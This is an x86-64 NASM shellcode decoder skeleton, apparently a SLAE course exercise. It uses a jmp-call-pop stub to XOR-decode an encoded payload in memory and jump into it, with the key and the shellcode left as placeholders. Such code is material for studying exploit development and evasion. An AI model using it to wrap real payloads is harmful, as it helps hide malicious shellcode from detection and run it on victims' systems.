; Filename: Decoder-Skeleton.nasm
; Author  : Andrea Perfetti
; SLAE ID : PA-29059

global _start			

section .text
_start:
	jmp ShellcodeToStack 

Decode:
	pop rsi 				; RSI --> Pointer to start of the encoded shellcode

	xor rdx, rdx
	xor rcx, rcx

Loop:
	xor rbx, rbx			; Zeroing RBX
	mov bl, byte [rsi+rcx]	; Shellcode byte into BL

	xor bl, <XOR_KEY_BYTE>	
	
	mov byte [rsi+rdx], bl 	; Save original byte

	inc rcx
	inc rdx

	xor rax, rax
	mov al, byte [rsi+rcx] 	; Shellcode byte into AL
	xor al, 0xFF	
	jz Execute		 		; If Zero (Control byte = 0xFF) Jump to shellcode

	inc rcx
	jmp short Loop

Execute:
	xor rbx, rbx
	mov bl, 0x90
	mov byte [rsi+rdx], bl
	jmp rsi

ShellcodeToStack:
	call Decode
	Shellcode: db <INSERT_HERE_THE_SHELLCODE>